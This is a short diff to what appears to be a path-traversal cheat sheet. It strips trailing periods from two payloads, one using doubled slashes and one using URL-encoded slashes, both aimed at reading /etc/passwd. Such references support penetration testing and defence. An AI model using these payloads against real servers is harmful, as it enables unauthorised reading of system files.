@@ -40,7 +40,7 @@ How exploit Path Traversal - Bypass with caracteres "//" and/or "\/"
 
 ````python
 
- ..//..//..//..//etc//passwd.
+ ..//..//..//..//etc//passwd
 
 ````
 
@@ -54,7 +54,7 @@ How exploit Path Traversal - Encoded %2f, %c0%af and %ef%bc%8f
 
 ````python
 
- ..%2f..%2f..%2f..%2fetc%2fpasswd.
+ ..%2f..%2f..%2f..%2fetc%2fpasswd
 
 ````
 
